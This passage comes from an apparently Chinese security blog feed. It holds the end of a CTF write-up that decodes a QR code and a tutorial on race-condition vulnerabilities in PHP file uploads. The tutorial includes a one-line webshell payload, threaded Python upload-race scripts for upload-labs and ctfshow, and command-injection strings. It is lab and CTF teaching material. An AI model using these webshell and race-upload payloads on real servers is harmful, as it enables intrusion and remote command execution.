bash">壹贰叁肆伍陆柒8玖〇壹2叁肆56柒89〇壹23肆伍<br>陆78901贰3肆56柒89〇1贰叁4伍陆7捌玖0<br>壹2叁肆伍6柒89〇壹贰叁肆5陆柒捌9〇123肆5<br>陆7捌玖〇1贰345陆柒8玖〇壹贰34567890<br>壹2叁肆伍6柒8玖01贰叁4伍6柒捌玖〇壹234伍<br>陆78901贰3肆5陆78玖0壹贰345陆7捌玖0<br>壹贰叁肆伍陆柒890壹贰叁肆56柒8玖0壹234伍<br>67890123肆伍6柒捌玖〇1贰345陆7890<br>壹贰3肆56柒捌90123肆56柒捌玖〇壹贰3肆5<br>67捌9〇1234伍陆78玖〇壹贰3肆5陆7捌9〇<br>12叁肆伍6柒8901贰叁肆伍陆7捌9〇壹2叁肆伍<br>陆柒89〇123肆伍67890壹234567捌玖0<br>壹2叁4伍陆柒捌901贰3肆56柒捌9〇壹2345<br>陆78玖0壹23肆伍67捌90壹2叁4伍陆7捌9〇<br>壹2叁45陆柒89〇1贰叁45陆7890壹23肆伍<br>陆柒8901234伍陆柒8玖〇1贰34伍6柒捌玖0<br>壹贰34伍陆柒89〇壹2叁肆5陆柒89〇1贰叁肆伍<br>678901234伍67捌9〇1234567890<br>壹贰叁肆伍陆柒8玖0壹2叁4伍6柒8玖〇壹贰叁肆伍<br>陆78901贰3肆伍陆7捌901贰3肆56789〇<br>壹2叁肆伍6柒89012345陆柒8玖0壹贰叁4伍<br>陆7捌玖〇1贰3肆56789〇1贰3肆5陆柒捌9〇<br>壹2叁肆伍6柒8玖〇1贰345陆柒8玖0壹贰叁4伍<br>陆78901贰3肆5678玖01贰3肆56789〇<br>壹贰叁肆伍陆柒8玖01贰3肆伍陆78玖〇壹贰叁肆伍<br></code></pre></td></tr></table></figure><p>汉字转换成1，数字换成0 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">1111111011101100100110011<br>1000001010010010110110110<br>1011101001111101110100010<br>1011101000110111100000000<br>1011101010011010111110001<br>1000001010100101100010110<br>1111111000111100101010001<br>0000000011011110100010000<br>1101001100000100111111010<br>0010100001100111101010101<br>0011101000011111010110111<br>1100100011000001000000110<br>1010111100010100110110000<br>1001010011001001010110101<br>1010011001011001000010011<br>1100000001110110100101110<br>1100111001101101100101111<br>0000000001001010000000000<br>1111111010101010101111111<br>1000001011101000101000001<br>1011101000000001101011101<br>1011101010000010101011101<br>1011101011010001101011101<br>1000001010000100101000001<br>1111111010010111001111111<br></code></pre></td></tr></table></figure><p>25x25,之前做过一样的，直接使用脚本转换成二维码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> PIL.Image<br>MAX = <span class="hljs-number">25</span><br>pic = PIL.Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX,MAX))<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;1111111011101100100110011100000101001001011011011010111010011111011101000101011101000110111100000000101110101001101011111000110000010101001011000101101111111000111100101010001000000001101111010001000011010011000001001111110100010100001100111101010101001110100001111101011011111001000110000010000001101010111100010100110110000100101001100100101011010110100110010110010000100111100000001110110100101110110011100110110110010111100000000010010100000000001111111010101010101111111100000101110100010100000110111010000000011010111011011101010000010101011101101110101101000110101110110000010100001001010000011111111010010111001111111&#x27;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>                        pic.putpixel([x,y],(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>                <span class="hljs-keyword">else</span>:<br>                        pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>                i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>扫描二维码得到flag</p>]]></content>
    
    
      
      
    <summary type="html"> &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;



&lt;h2 id=&quot;练武&quot;&gt;&lt;a href=&quot;#练武&quot; class=&quot;headerlink&quot; title=&quot;练武&quot;&gt;&lt;/a&gt;练武&lt;/h2&gt;&lt;h3 id=&quot;李华的红包&quot;&gt;&lt;a href=&quot;#李华的红包&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="比赛复现" scheme="http://atkx.top/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="http://atkx.top/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>浅析条件竞争漏洞</title>
    <link href="http://atkx.top/2021/05/23/%E6%B5%85%E6%9E%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/"/>
    <id>http://atkx.top/2021/05/23/%E6%B5%85%E6%9E%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-05-23T14:05:15.000Z</published>
    <updated>2021-08-15T03:59:06.609Z</updated>
    
    <content type="html"><![CDATA[ <a id="more"></a><h2 id="0x00-条件竞争"><a href="#0x00-条件竞争" class="headerlink" title="0x00-条件竞争"></a>0x00-条件竞争</h2><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果，简而言之就是并没有考虑线程同步。因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01-基础知识"></a>0x01-基础知识</h2><p>先来了解一下关于条件竞争的基础知识</p><p><strong>条件竞争</strong>：<br>系统中，最小的运算调度单位是线程，而每个线程又依附于一个进程，条件竞争则是多进程 或多线程对一个共享资源操作，因为操作顺序不受控的时候所产生的问题。</p><p><strong>进程</strong>：<br>进程是为了更好的利用CPU的资源；进程是系统进行资源分配和调度的一个独立单位；每个进程都有自己的独立内存空间，不同进程 通过进程间通信来通信；由于进程比较重要，占据独立的内存，所以上 下文进程间的切换开销（栈、寄存器、虚拟内 存、文件句柄等）比较大，但相对比较稳定安 全。</p><p><strong>线程</strong>：<br>线程的是为了降低上下文切换的消耗，提高系 统的并发性，并突破一个进程只能干一样事的 缺陷，使到进程内并发成为可能。 线程是进程的一个实体,是CPU调度和分派的基 本单位,它是比进程更小的能独立运行的基本单 位。线程自己基本上不拥有系统资源,只拥有一点在 运行中必不可少的资源(如程序计数器,一组寄 存器和栈),但是它可与同属一个进程的其他的 线程共享进程所拥有的全部资源。 线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易 丢失数据。<br><strong>Session：</strong><br>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02-漏洞分析"></a>0x02-漏洞分析</h2><p>攻击者不断的发起访问请求访问该文件，该文件一旦被执行，就会在服务器上生成一个恶意的shell文件</p><p>首先上传一个php文件，然后检测文件后缀名，如果不符合条件，就删掉，虽然php代码在执行的时候是线性执行代码的，但是执行的时候可以有多个线程。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$ext</span> = substr(<span class="hljs-variable">$filename</span>,strrpos(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>);   <span class="hljs-comment">#后缀</span><br><br><span class="hljs-variable">$path</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$tmp</span>, <span class="hljs-variable">$path</span>))&#123;<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/php/i&#x27;</span>, <span class="hljs-variable">$ext</span>))&#123;   <span class="hljs-comment">#判断后缀是否为php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;upload success,file in &#x27;</span>.<span class="hljs-variable">$path</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>unlink(<span class="hljs-variable">$path</span>);    <span class="hljs-comment">#已经上传后判断若是PHP则删除</span><br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;can&#x27;t upload php file!&quot;</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;upload error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>继续上传一个php文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;c&quot;]);?&gt;&#x27;</span>;<br>file_put_contents(<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-variable">$content</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>在执行完move_uploaded_file之后，执行unlink之前，此时这个php文件是已经保存到了web服务器上的，并且我们能够访问。</p><p>如果上传的php的功能是写一句话到一个php文件，这样我们在删除之前访问该文件，就会生成一个一句话木马，就可以得到webshell。 所以我们使用多线程并发的不断访问上传的文件，务器中的函数执行都是需要时间的，如果我上传上去的文件在没被删除的时候，一旦成功访问到了上传的文件，那么它就会向服务器写入shell。</p><p>   一般而言，我们是上传了文件，但是最后却因为过滤或者因为其他原因被删除了，那么我们可以使用条件竞争，我们实际上是和unlink，以及删除文件的函数进行竞争。文件被访问了依旧可以删除，它删除跟我访问没有任何关系。</p><h2 id="0x03-CTF中的条件竞争"><a href="#0x03-CTF中的条件竞争" class="headerlink" title="0x03-CTF中的条件竞争"></a>0x03-CTF中的条件竞争</h2><h3 id="upload-libs-pass17"><a href="#upload-libs-pass17" class="headerlink" title="upload-libs pass17"></a>upload-libs pass17</h3><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$file_name</span>,strrpos(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = <span class="hljs-variable">$UPLOAD_ADDR</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$UPLOAD_ADDR</span> . <span class="hljs-string">&#x27;/&#x27;</span>. rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             rename(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            unlink(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<span class="hljs-comment">//存储在服务器的文件的临时副本的名称</span><br></code></pre></td></tr></table></figure><p>当我们上传web shell文件时，不会先限制php类型文件上传，先利用上面的语句把上传的文件临时存放。再执行下面的if语句进行文件类型的限制和文件名的时间戳。然后执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))<span class="hljs-comment">//移动到新文件夹</span><br></code></pre></td></tr></table></figure><p>绕过思路是利用代码执行过程有耗费时间的过程，上传速度大于匹配unlink条件就能显示webshell界面</p><p><strong>方法一</strong>：使用brup抓包</p><p>使用burpsuite抓包上传shell.php，一直重放上传文件</p><p>shell.php内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;pass.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>只要访问了shell.php文件，php文件就会成功解析执行，自动创建一个pass.php，写入一句话木马：<code>&lt;?php phpinfo();?&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210414203927555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后Send to lntruder，并且进行以下的设置<br><img src="https://img-blog.csdnimg.cn/20210426193037110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Payload设置<br><img src="https://img-blog.csdnimg.cn/20210426193244134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后不停访问<code>http://localhost/upload-labs/upload/shell.php</code>，爆破结束后，访问pass.php，出现phpinfo信息，shell上传成功<img src="https://img-blog.csdnimg.cn/20210426193746282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>方法二</strong>：pytho多线程上传</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">td</span>(<span class="hljs-params"><span class="hljs-built_in">list</span></span>):</span><br>    url = <span class="hljs-string">&#x27;http://localhost/upload-labs/Pass-17/index.php&#x27;</span><br>    files = &#123;<span class="hljs-string">&#x27;upload_file&#x27;</span>: (<br>        <span class="hljs-string">&#x27;shell2.php&#x27;</span>, <span class="hljs-string">&quot;&lt;?php fputs(fopen(&#x27;pass2.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt;&quot;</span>)&#125;<br>    data = &#123;<span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;上传&#x27;</span>&#125;<br>    r = requests.post(url=url, data=data, files=files)<br>    re = requests.get(<span class="hljs-string">&#x27;http://localhost/upload-labs/upload/shell2.php&#x27;</span>)<br>    <span class="hljs-keyword">if</span> re.status_code == <span class="hljs-number">200</span>:<br>        print(<span class="hljs-string">&#x27;上传成功&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(<span class="hljs-number">20</span>) <span class="hljs-keyword">as</span> p:<br>        p.<span class="hljs-built_in">map</span>(td, <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>))<br></code></pre></td></tr></table></figure><p>访问pass2.php，也能看到phpinfo页面<br><img src="https://img-blog.csdnimg.cn/2021042619421151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="ctfhsow-大牛杯-web-checkin"><a href="#ctfhsow-大牛杯-web-checkin" class="headerlink" title="ctfhsow [大牛杯]-web_checkin"></a>ctfhsow [大牛杯]-web_checkin</h3><p>看<a href="https://blog.csdn.net/miuzzx/article/details/116352564">羽师傅</a>的大牛杯wp，发现用到了条件竞争漏洞，照着wp复现一下。</p><p>随便传参一个code=1,F12查看源码，注释提示仅允许index.php存在，删除所有其他文件，从这句话里可以猜测含有条件竞争漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!-- 仅允许index.php存在，删除所有其他文件 --&gt;<br>xi nei~<br></code></pre></td></tr></table></figure><p>查看所有文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=?&gt;&lt;?=`nl%09*`<br></code></pre></td></tr></table></figure><p>读取到部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span>`nl*`<br> <span class="hljs-number">2</span><span class="hljs-meta">?&gt;</span><br> <span class="hljs-number">3</span><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-number">4</span>    opendir(<span class="hljs-string">&quot;./&quot;</span>);<br> <span class="hljs-number">5</span>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$filename</span> = readdir()) &#123;<br> <span class="hljs-number">6</span>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;.&quot;</span> &amp;&amp; <span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;..&quot;</span> &amp;&amp; <span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br> <span class="hljs-number">7</span>            unlink(<span class="hljs-variable">$filename</span>);<br> <span class="hljs-number">8</span>        &#125;<br> <span class="hljs-number">9</span>    &#125;<br><span class="hljs-number">10</span>    closedir();<br><span class="hljs-number">11</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>生成文件atkx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=`nl%09/*&gt;atkx`<br></code></pre></td></tr></table></figure><p>直接使用羽师傅的脚本进行条件竞争，将源码写入atkx中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment">#author: yu2xx</span><br>import requests<br>import threading<br>import sys<br>session=requests.session()<br>url1=<span class="hljs-string">&quot;http://bdd02bb0-9c48-4203-806f-64219749382b.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/&quot;</span><br>url2=<span class="hljs-string">&#x27;http://bdd02bb0-9c48-4203-806f-64219749382b.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/atkx&#x27;</span><br>def write():<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = session.get(url1)<br>def read():<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = session.get(url2)<br><span class="hljs-keyword">if</span> len(r.text)!=<span class="hljs-number">9561</span>: <span class="hljs-comment">#随便get传一次就能得到这个长度</span><br>    <span class="hljs-keyword">print</span>(r.text)<br><br>threads = [threading.Thread(target=write),<br>       threading.Thread(target=read)]<br><span class="hljs-keyword">for</span> t in threads:<br>t.start()<br></code></pre></td></tr></table></figure><p>然后访问atkx可以读取到源码<br><img src="https://img-blog.csdnimg.cn/20210510193858557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>想要得到flag的话，直接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=?&gt;&lt;?=`nl%09/*<br></code></pre></td></tr></table></figure><h3 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>考查</strong>：利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>进行文件包含</p><ul><li>前提: 需要知道session文件的存放位置。</li><li>思路: 利用session.upload_progress将恶意语句写入session文件，从而包含session文件。</li></ul><p>session.upload_progress 是PHP5.4的新特征。<br><img src="https://img-blog.csdnimg.cn/2021052021583531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>php.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1.</span>session.use_strict_mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。<span class="hljs-number">1.</span> session.upload_progress.enabled = on<br>enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；<br><br><span class="hljs-number">2.</span> session.upload_progress.cleanup = on<br>cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；<br><br><span class="hljs-number">3.</span> session.upload_progress.prefix = <span class="hljs-string">&quot;upload_progress_&quot;</span><br>prefix+name将表示为session中的键名<br><br><span class="hljs-number">4.</span> session.upload_progress.name = <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br>name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；<br><br><span class="hljs-number">5.</span>session.use_strict_mode=off<br>这个选项默认值为off，表示对Cookie中sessionid可控。<br></code></pre></td></tr></table></figure><p>一个上传进度数组的结构的例子</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">#PHPSESSION = Sn0w<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload.php&quot;</span> <span 